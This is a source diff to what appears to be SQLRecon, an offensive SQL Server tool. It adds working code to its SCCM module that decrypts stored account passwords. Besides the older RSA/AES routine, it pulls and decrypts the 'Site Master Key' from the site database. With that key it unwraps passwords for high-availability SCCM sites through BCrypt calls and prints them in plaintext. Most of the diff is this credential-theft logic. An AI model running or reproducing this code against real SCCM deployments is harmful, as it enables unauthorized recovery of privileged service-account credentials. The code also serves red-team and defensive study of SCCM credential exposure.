@@ -1,14 +1,17 @@
-﻿using System;
+﻿using SQLRecon.Commands;
+using SQLRecon.Utilities;
+using System;
 using System.Collections.Generic;
-using System.Xml.Linq;
-using System.Linq;
-using System.Text;
 using System.Data.SqlClient;
+using System.Linq;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Runtime.Remoting.Contexts;
+using System.Security.AccessControl;
 using System.Security.Cryptography;
 using System.Security.Principal;
-using System.Runtime.InteropServices;
-using SQLRecon.Commands;
-using SQLRecon.Utilities;
+using System.Text;
+using System.Xml.Linq;
 
 namespace SQLRecon.Modules
 {
@@ -385,7 +388,7 @@ namespace SQLRecon.Modules
                         Print.Nested($"Username: {username}", true);
 
                         Print.Nested(
-                            DecryptSccm.DecryptSccmCredential(password, out string plaintextPw)
+                            DecryptSccm.DecryptSccmCredential(con, password, out string plaintextPw)
                                 ? $"Password: {plaintextPw}"
                                 : $"Failed To Recover Password. Error: {plaintextPw}", true);
 
@@ -1053,11 +1056,12 @@ namespace SQLRecon.Modules
     }
 
     /// <summary>
-    /// The following class is adopted from @XPN's SCCM Decryption PoC Gist: 
-    /// Reference: https://t.ly/Dlinv
+    /// Class contains Crypto / decryption related functions specific to SCCM operations
     /// </summary>
     internal abstract class DecryptSccm
     {
+        private static byte[] _siteMasterKey = null;
+
         [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         static extern bool CryptAcquireContext(ref IntPtr hProv, string pszContainer, string pszProvider, uint dwProvType, uint dwFlags);
@@ -1070,14 +1074,43 @@ namespace SQLRecon.Modules
         [return: MarshalAs(UnmanagedType.Bool)]
         private static extern bool CryptImportKey(IntPtr hProv, byte[] pbKeyData, UInt32 dwDataLen, IntPtr hPubKey, UInt32 dwFlags, ref IntPtr hKey);
 
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool CryptReleaseContext(IntPtr hProv, int dwFlags);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool CryptDestroyKey(IntPtr hKey);
+
+        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
+        private static extern int BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, string pszAlgId, string pszImplementation, int dwFlags);
+
+        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
+        private static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, int dwFlags);
+
+        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
+        private static extern int BCryptSetProperty(IntPtr hObject, string pszProperty, byte[] pbInput, int cbInput, int dwFlags);
+
+        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
+        private static extern int BCryptImportKey(IntPtr hAlgorithm, IntPtr hImportKey, string pszBlobType, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbInput, int cbInput, int dwFlags);
+
+        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
+        private static extern int BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, IntPtr pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, int dwFlags); 
+
+        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
+        private static extern int BCryptDestroyKey(IntPtr hKey);
+
+        private const string CNG_PROVIDER_NAME = "Microsoft Primitive Provider";
+        private const string BCRYPT_RFC3565_KEY_BLOB = "Rfc3565KeyWrapBlob";
+        private const string BCRYPT_OPAQUE_KEY_BLOB = "OpaqueKeyBlob";
+        private const string BCRYPT_AES_ALGORITHM = "AES";
+        private const string BCRYPT_CHAIN_MODE_CBC = "ChainingModeCBC";
+
         /// <summary>
-        /// @XPN's initial PoC SCCM secret decryption gist:
-        /// Reference: https://t.ly/Dlinv
-        /// </summary>
+        /// front-door method that will handle decryption based on structure of credential blob
+        /// <param name="con"></param>
         /// <param name="credentialBlob"></param>
         /// <param name="plaintextPw"></param>
         /// <returns></returns>
-        internal static bool DecryptSccmCredential(string credentialBlob, out string plaintextPw)
+        internal static bool DecryptSccmCredential(SqlConnection con, string credentialBlob, out string plaintextPw)
         {
             IntPtr kHandle = IntPtr.Zero;
             IntPtr context = IntPtr.Zero;
@@ -1085,52 +1118,280 @@ namespace SQLRecon.Modules
             byte[] decryptedLengthBuffer = new byte[4];
 
             var inputData = _strToByteArr(credentialBlob);
-            if (inputData == null)
+
+            if(inputData == null || inputData.Length < 8)
             {
                 plaintextPw = "[!] Input string not in correct format, skipping.";
                 return false;
             }
-            Array.Copy(inputData, 0, keyLengthBuffer, 0, 4);
-            int keyLength = BitConverter.ToInt32(keyLengthBuffer, 0);
 
-            Array.Copy(inputData, 4, decryptedLengthBuffer, 0, 4);
-
-            var cryptLength = (uint)(inputData.Length - 8 - (keyLength));
-
-            var key = new byte[keyLength];
-            Array.Copy(inputData, 8, key, 0, keyLength);
-
-            if (!CryptAcquireContext(ref context, "Microsoft Systems Management Server", "Microsoft Enhanced RSA and AES Cryptographic Provider", 0x18, 96U) && !CryptAcquireContext(ref context, "Microsoft Systems Management Server", null, 0x18, 104U))
+            //classic SCCM RSA/AES encryption format
+            if (inputData[0] == 0x0C && inputData[1] == 0x01 && inputData[2] == 0x00 && inputData[3] == 0x00)
             {
-                uint lastWin32Error = (uint)Marshal.GetLastWin32Error();
-                plaintextPw = $"CryptAcquireContext failed with HRESULT {lastWin32Error}";
+                if(DecryptRSA(inputData, out byte[] plaintextData))
+                {
+                    plaintextPw = Encoding.UTF8.GetString(plaintextData, 0, plaintextData.Length);
+                    return true;
+                }
+                else
+                {
+                    plaintextPw = Encoding.ASCII.GetString(plaintextData);
+                    return false;
+                }
+            }
+            //active-passive SCCM BCrypt/AES encryption format
+            else if (inputData[0] == 0x00 && inputData[1] == 0x00 && inputData[2] == 0x00 && inputData[3] == 0x00)
+            {
+                if(inputData[4] == 0x02 && inputData[5] == 0x00 && inputData[6] == 0x00 && inputData[7] == 0x00)
+                {
+                    plaintextPw = "[X] Error: Credential appears to be encrypted using PKI, we do not currently have logic to decrypt this";
+                    return false;
+                }
+
+                if (!(inputData[4] == 0x01 && inputData[5] == 0x00 && inputData[6] == 0x00 && inputData[7] == 0x00))
+                {
+                    plaintextPw = "[!] Encrypted password stored with an unknown blob format, manually dump SC_UserAccount table and check out how password is stored";
+                    return false;
+                }
+
+                if (_siteMasterKey == null)
+                {
+                    string currentHost = Dns.GetHostName();                    
+                    string xmlBlob = Sql.CustomQuery(con, string.Format(Query.GetSiteMasterKey, currentHost));
+
+                    if (!ParseSiteResourceUseProps(xmlBlob))
+                    {
+                        plaintextPw = "[X] Error: Unable to recover site master key for current server";
+                        return false;
+                    }
+                }
+
+                if(DecryptCNG(inputData, out byte[] plaintextData))
+                {
+                    plaintextPw = Encoding.UTF8.GetString(plaintextData, 0, plaintextData.Length);
+                    return true;
+                }
+                else
+                {
+                    plaintextPw = Encoding.ASCII.GetString(plaintextData);
+                    return false;
+                }
+            }
+            else
+            {
+                plaintextPw = "[!] Encrypted password stored with an unknown blob format, manually dump SC_UserAccount table and check out how password is stored";
+                return false;
+            }            
+        }
+                
+
+        /// <summary>
+        /// Decrypts "classic" RSA/AES blobs using the logic from 
+        /// @_XPN_'s initial PoC SCCM secret decryption gist:
+        /// Reference: https://t.ly/Dlinv
+        /// </summary>
+        /// <param name="credentialBlob"></param>
+        /// <param name="plaintextPw"></param>
+        /// <returns></returns>
+        private static bool DecryptRSA(byte[] inputData, out byte[] plaintextData)
+        {
+            IntPtr kHandle = IntPtr.Zero;
+            IntPtr context = IntPtr.Zero;
+            byte[] keyLengthBuffer = new byte[4];
+            byte[] decryptedLengthBuffer = new byte[4];
+            try
+            {
+                Array.Copy(inputData, 0, keyLengthBuffer, 0, 4);
+                int keyLength = BitConverter.ToInt32(keyLengthBuffer, 0);
+
+                Array.Copy(inputData, 4, decryptedLengthBuffer, 0, 4);
+
+                var cryptLength = (uint)(inputData.Length - 8 - (keyLength));
+
+                var key = new byte[keyLength];
+                Array.Copy(inputData, 8, key, 0, keyLength);
+
+                if (!CryptAcquireContext(ref context, "Microsoft Systems Management Server", "Microsoft Enhanced RSA and AES Cryptographic Provider", 0x18, 96U) && !CryptAcquireContext(ref context, "Microsoft Systems Management Server", null, 0x18, 104U))
+                {
+                    uint lastWin32Error = (uint)Marshal.GetLastWin32Error();
+                    plaintextData = Encoding.ASCII.GetBytes($"CryptAcquireContext failed with HRESULT {lastWin32Error}");
+                    return false;
+                }
+
+                if (!CryptImportKey(context, key, (uint)keyLength, IntPtr.Zero, 0, ref kHandle))
+                {
+                    uint lastWin32Error2 = (uint)Marshal.GetLastWin32Error();
+                    plaintextData = Encoding.ASCII.GetBytes($"CryptImportKey failed with HRESULT {lastWin32Error2}");
+                    return false;
+                }
+
+                var crypted = new byte[cryptLength];
+                Array.Copy(inputData, 8 + keyLength, crypted, 0, inputData.Length - 8 - (keyLength));
+
+                if (!CryptDecrypt(kHandle, IntPtr.Zero, 1, 0, crypted, ref cryptLength))
+                {
+                    uint lastWin32Error3 = (uint)Marshal.GetLastWin32Error();
+                    plaintextData = Encoding.ASCII.GetBytes($"CryptDecrypt failed with HRESULT {lastWin32Error3}");
+                    return false;
+                }
+                Array.Resize(ref crypted, (int)cryptLength);
+                plaintextData = crypted;
+                return true;
+            }
+            catch(Exception e) 
+            {
+                plaintextData = Encoding.ASCII.GetBytes($"Unhandled error in RSA decryption: " + e.ToString());
                 return false;
             }
-
-            if (!CryptImportKey(context, key, (uint)keyLength, IntPtr.Zero, 0, ref kHandle))
+            finally
             {
-                uint lastWin32Error2 = (uint)Marshal.GetLastWin32Error();
-                plaintextPw = $"CryptImportKey failed with HRESULT {lastWin32Error2}";
-                return false;
-            }
-
-            var crypted = new byte[cryptLength];
-            Array.Copy(inputData, 8 + keyLength, crypted, 0, inputData.Length - 8 - (keyLength));
-
-            if (!CryptDecrypt(kHandle, IntPtr.Zero, 1, 0, crypted, ref cryptLength))
-            {
-                uint lastWin32Error3 = (uint)Marshal.GetLastWin32Error();
-                plaintextPw = $"CryptDecrypt failed with HRESULT {lastWin32Error3}";
-                return false;
-            }
-
-            plaintextPw = Encoding.ASCII.GetString(crypted, 0, (int)cryptLength);
-            return true;
+                if (kHandle != IntPtr.Zero)
+                {
+                    CryptDestroyKey(kHandle);
+                }                    
+                if (context != IntPtr.Zero)
+                {
+                    CryptReleaseContext(context, 0);
+                }                    
+            }      
         }
 
         /// <summary>
-        /// Needed for @XPN's initial PoC SCCM secret decryption gist:
-        /// Reference: https://t.ly/Dlinv
+        /// Decrypts BCrypt/AES blob format used by SCCM sites 
+        /// configured for high availability (active-passive). 
+        /// Will automatically attempt to recover hostname of current server to retrieve appropriate Site Master Key
+        /// </summary>
+        /// <param name="passwordBlob"></param>
+        /// <param name="plaintextData"></param>
+        /// <returns></returns>
+        private static bool DecryptCNG(byte[] passwordBlob, out byte[] plaintextData)
+        {
+            if (_siteMasterKey.Length == 0 || passwordBlob.Length < 16)
+            {
+                plaintextData = Array.Empty<byte>();
+                return false;
+            }
+
+            int wrappedKeyLen = BitConverter.ToInt32(passwordBlob, 8);
+            int cipherLen = BitConverter.ToInt32(passwordBlob, 12);
+
+            byte[] wrappedKey = new byte[wrappedKeyLen];
+            Array.Copy(passwordBlob, 16, wrappedKey, 0, wrappedKeyLen);
+
+            byte[] cipherText = new byte[cipherLen];
+            Array.Copy(passwordBlob, 16 + wrappedKeyLen, cipherText, 0, cipherLen);
+
+            if (BCryptOpenAlgorithmProvider(out IntPtr hAlg, BCRYPT_AES_ALGORITHM, CNG_PROVIDER_NAME, 0) != 0)
+            {
+                plaintextData = Array.Empty<byte>();
+                return false;
+            }
+
+            BCryptSetProperty(hAlg, BCRYPT_CHAIN_MODE_CBC, Encoding.Unicode.GetBytes(BCRYPT_CHAIN_MODE_CBC), Encoding.Unicode.GetByteCount(BCRYPT_CHAIN_MODE_CBC), 0);
+
+
+            if (BCryptImportKey(hAlg, IntPtr.Zero, BCRYPT_OPAQUE_KEY_BLOB, out IntPtr hMasterKey, IntPtr.Zero, 0, _siteMasterKey, _siteMasterKey.Length, 0) != 0)
+            {
+                plaintextData = Array.Empty<byte>();
+                return false;
+            }
+
+            if (BCryptImportKey(hAlg, hMasterKey, BCRYPT_RFC3565_KEY_BLOB, out IntPtr hSessionKey, IntPtr.Zero, 0, wrappedKey, wrappedKey.Length, 0) != 0)
+            {
+                plaintextData = Array.Empty<byte>();
+                return false;
+            }
+
+            byte[] plain = new byte[cipherText.Length + 16];
+            BCryptDecrypt(hSessionKey, cipherText, cipherText.Length, IntPtr.Zero, null, 0, plain, plain.Length, out int cbPlain, 0);
+            Array.Resize(ref plain, cbPlain);
+            BCryptDestroyKey(hSessionKey);
+            BCryptDestroyKey(hMasterKey);
+            BCryptCloseAlgorithmProvider(hAlg, 0);
+
+            //Trim PKCS#7 padding if present
+            if (plain.Length > 0)
+            {
+                byte padLen = plain[plain.Length - 1];
+                if (padLen > 0 && padLen <= 16)
+                {
+                    bool validPadding = true;
+                    for (int i = plain.Length - padLen; i < plain.Length; i++)
+                    {
+                        if (plain[i] != padLen)
+                        {
+                            validPadding = false;
+                            break;
+                        }
+                    }
+                    if (validPadding)
+                    {
+                        Array.Resize(ref plain, plain.Length - padLen);
+                    }
+                }
+            }
+
+            plaintextData = plain;
+            return true;
+        }
+
+        private static bool ParseSiteResourceUseProps(string rawXML)
+        {
+            try
+            {
+                if (string.IsNullOrWhiteSpace(rawXML))
+                    return false;
+
+                int startIdx = rawXML.IndexOf('<');
+                int endIdx = rawXML.LastIndexOf('>');
+                string cleanXML = "";
+
+                if (startIdx >= 0 && endIdx >= startIdx)
+                {
+                    cleanXML = rawXML.Substring(startIdx, endIdx - startIdx + 1).Trim();
+                }
+
+                else
+                {
+                    return false;
+                }
+
+                XDocument doc = XDocument.Parse(cleanXML);
+
+                var siteMasterKeyProp = doc
+                    .Descendants("Property")
+                    .FirstOrDefault(p =>
+                        string.Equals(p.Attribute("Name")?.Value, "Site Master Key", StringComparison.OrdinalIgnoreCase));
+
+                if (siteMasterKeyProp == null)
+                    return false;
+
+                string keyHex = siteMasterKeyProp.Attribute("Value1")?.Value;
+                if (string.IsNullOrWhiteSpace(keyHex))
+                    return false;
+
+                byte[] encryptedKeyBytes = _strToByteArr(keyHex);
+                if (encryptedKeyBytes == null || encryptedKeyBytes.Length == 0)
+                    return false;
+
+                if (DecryptRSA(encryptedKeyBytes, out byte[] decryptedKey))
+                {
+                    _siteMasterKey = decryptedKey;
+                    return true;
+                }
+
+                return false;
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[X] Error: " + ex.Message);
+                return false;
+            }
+        }
+
+
+        /// <summary>
+        /// Helper method to convert hex string to byte array
         /// </summary>
         /// <param name="inputString"></param>
         /// <returns></returns>
